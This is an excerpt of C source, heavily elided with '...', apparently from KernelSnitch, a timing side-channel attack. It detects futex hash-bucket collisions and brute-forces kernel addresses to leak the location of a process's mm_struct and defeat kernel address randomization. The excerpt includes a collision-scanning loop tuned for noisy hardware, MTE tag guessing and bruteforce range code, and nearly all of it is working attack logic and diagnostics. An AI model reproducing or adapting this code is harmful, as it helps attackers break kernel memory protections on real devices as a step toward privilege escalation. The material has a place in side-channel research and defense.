    ...
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        ...
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
                ...
                if (!ks->mte_enabled) {
                    static size_t diag_count = 0;
                    static size_t match_count = 0;
                    size_t nmatches = 0;
                    uint32_t h0 = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
                    for (size_t i = 1; i < ks->collisions; ++i) {
                        uint32_t hi = futex_hash(ks->futex_addrs[i], mm_struct_candidate);
                        if (hi == h0) nmatches++;
                    }
                    size_t need = ks->collisions / 2;
                    if (nmatches >= need) {
                        match_count++;
                        pr_info("MATCH cand=%016zx nmatch=%zd/%zd need=%zd match_total=%zd\n",
                            mm_struct_candidate, nmatches, ks->collisions - 1, need, match_count);
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                    if (diag_count < 200) {
                        uint32_t h1 = (ks->collisions > 1) ? futex_hash(ks->futex_addrs[1], mm_struct_candidate) : 0;
                        uint32_t h2 = (ks->collisions > 2) ? futex_hash(ks->futex_addrs[2], mm_struct_candidate) : 0;
                        uint32_t h3 = (ks->collisions > 3) ? futex_hash(ks->futex_addrs[3], mm_struct_candidate) : 0;
                        uint32_t bucket0 = h0 & 2047;
                        uint32_t bucket1 = h1 & 2047;
                        pr_info("DIAG[%zd] cand=%016zx h0=%u b0=%u h1=%u b1=%u h2=%u h3=%u nmatch=%zd\n",
                            diag_count, mm_struct_candidate, h0, bucket0, h1, bucket1, h2, h3, nmatches);
                        diag_count++;
                    }
                } else {
                    for (size_t tag_candidate = 0;
                        ...
                        size_t nmatches = 0;
                        uint32_t h0 = futex_hash(ks->futex_addrs[0], __mm_struct_candidate);
                        for (size_t i = 1; i < ks->collisions; ++i) {
                            uint32_t hi = futex_hash(ks->futex_addrs[i], __mm_struct_candidate);
                            if (hi == h0) nmatches++;
                        }
                    size_t need = ks->collisions / 2;
                        if (nmatches >= need) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx nmatch=%zd/%zd\n", __mm_struct_candidate, nmatches, ks->collisions - 1);
...
#error "invalid KernelSnitch baseline profile"
    ...
    if (ks->verbose) pr_info("before increase\n");
    __increase(ks, ID, ks->appended_futexes);
    if (ks->verbose) pr_info("after increase, start finding collisisons\n");
    ...
    /* Optional: limit scan range for controlled testing */
    {
        char *limit_env = getenv("KSNITCH_SCAN_LIMIT");
        if (limit_env) {
            size_t limit = (size_t)strtoul(limit_env, NULL, 0);
            if (limit > 2 && limit < ks->total_futexes) {
                pr_info("KSNITCH_SCAN_LIMIT: truncating scan from %zu to %zu\n",
                        ks->total_futexes, limit);
                ks->total_futexes = limit;
            }
        }
    }
    /* TOP-K SELECTION FIX: on noisy SoCs, threshold-crossers include
       scheduler/timer artifacts that arrive EARLIER in scan order than
       the true pile-colliders, poisoning the candidate set. Collect ALL
       confirmed candidates, then keep only the slowest `wanted` -- the
       genuine bucket-128 colliders are the extreme outliers. */
    size_t cand_count = 0;
    size_t cand_cap = 256;
    size_t *cand_addr = (size_t *)calloc(cand_cap, sizeof(size_t));
    size_t *cand_time = (size_t *)calloc(cand_cap, sizeof(size_t));
    for (size_t i = 2; i < ks->total_futexes; ++i) {
        ...
        if (ks->verbose && (i % 10000) == 0)
            pr_info("scan progress %zu/%zu t=%zu\n", i, ks->total_futexes, ks->times[i]);
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            ...
            if (cand_count == cand_cap) {
                cand_cap *= 2;
                cand_addr = (size_t *)realloc(cand_addr, cand_cap*sizeof(size_t));
                cand_time = (size_t *)realloc(cand_time, cand_cap*sizeof(size_t));
            }
            cand_addr[cand_count] = futex_addr;
            cand_time[cand_count] = ks->times[i];
            cand_count++;
        }
    }
    /* selection sort top-k by descending time */
    count = cand_count < wanted ? cand_count : wanted;
    for (size_t sel = 1; sel <= count && sel <= cand_count; ++sel) {
        size_t best = sel - 1;
        for (size_t j = sel; j < cand_count; ++j)
            if (cand_time[j] > cand_time[best]) best = j;
        size_t ta=cand_time[sel-1], aa=cand_addr[sel-1];
        cand_time[sel-1]=cand_time[best]; cand_addr[sel-1]=cand_addr[best];
        cand_time[best]=ta; cand_addr[best]=aa;
        ks->futex_addrs[sel] = cand_addr[sel-1];
        if (ks->verbose) pr_info("  %016zx t=%zu\n", cand_addr[sel-1], cand_time[sel-1]);
    }
    free(cand_addr); free(cand_time);
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        if (ks->verbose) {
            pr_info("HASH-DIAG: target_bucket=128 target_addr=%016zx\n",
                    (size_t)&ks->inc_futex[ID]);
            for (size_t j = 0; j < count; ++j) {
                pr_info("HASH-DIAG: cand[%zu]=%016zx time=%zu\n",
                        j, ks->futex_addrs[j+1], cand_time[j]);
            }
        }
    ...
    {   /* unconditional timing landscape dump */
        size_t min_t=(size_t)-1,max_t=0,sum_t=0,n_t=0;
        for(size_t i=2;i<ks->total_futexes;++i){
            ...
            if(ks->times[i]<min_t) min_t=ks->times[i];
            if(ks->times[i]>max_t) max_t=ks->times[i];
            sum_t+=ks->times[i]; n_t++;
        }
        pr_warning("KSDIAG approx=%zu thr=%zu min=%zu max=%zu mean=%zu n=%zu\n",
            approx_time,approx_time*KERNELSNITCH_THRESHOLD_MULT,min_t,max_t,
            n_t?sum_t/n_t:0,n_t);
    }
    __decrease(ks);
}
 ...
 * @arg ks: shared KernelSnitch state
 */
uintptr_t kernelsnitch_match_page(struct kernelsnitch_shared_state *ks, uintptr_t base)
{
    ...
    for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
         candidate += ks->mm_struct_sz) {
        uint32_t h0 = futex_hash(ks->futex_addrs[0], candidate);
        size_t matches = 1;
        for (size_t i = 1; i < ks->collisions; ++i) {
            matches += h0 == futex_hash(ks->futex_addrs[i], candidate);
        }
    ...
    pr_info("kernelsnitch_match_page base=%016zx found=%016zx count=%zu/%zu\n",
            base, found, count, ORDER3_SIZE / ks->mm_struct_sz);
...
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ...
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) {
        pr_info("start bruteforcing\n");
        pr_info("identity_diff=%zx slide=%zx\n",
            ks->identity_diff, ks_slide_delta);
        pr_info("mm_struct_sz=%zx mm_slab_order=%zd mm_slab_sz=%zx\n",
            ks->mm_struct_sz, ks->mm_slab_order, (size_t)KS_PAGE_SIZE << ks->mm_slab_order);
        for (size_t i = 0; i < ks->collisions + 1 && ks->futex_addrs[i]; ++i)
            pr_info("futex_addrs[%zd]=%016zx\n", i, ks->futex_addrs[i]);
        {
            size_t test_mm = ks->futex_addrs[0] ? IDENTITY_START + ks_slide_delta : 0;
            if (test_mm) {
                uint32_t h0 = futex_hash(ks->futex_addrs[0], test_mm);
                uint32_t h1 = ks->collisions > 1 ? futex_hash(ks->futex_addrs[1], test_mm) : 0;
                pr_info("DIAG sample: mm=%016zx futex0=%016zx futex1=%016zx h0=%u h1=%u eq=%d\n",
                    test_mm, ks->futex_addrs[0],
                    ks->collisions > 1 ? ks->futex_addrs[1] : 0, h0, h1, h0==h1);
            }
        }
        {
            futex_key_t zero_key;
            memset(&zero_key, 0, sizeof(zero_key));
            uint32_t zh = futex_hash_no_trunc(&zero_key);
            pr_info("DIAG selftest: zero_key hash=%u\n", zh);
#if defined(KS_SELFTEST)
            uint32_t kh = ks_kern_ref(&zero_key);
            pr_info("DIAG selftest: kern_ref=%u user=%u match=%d\n", kh, zh, kh==zh);
#endif
        }
    }
    reset_cpu_pin();
...
#else
        mm_leak_arg->range.start = IDENTITY_START + ks_slide_delta + ks->identity_diff*i;
        mm_leak_arg->range.end = IDENTITY_START + ks_slide_delta + ks->identity_diff*(i+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
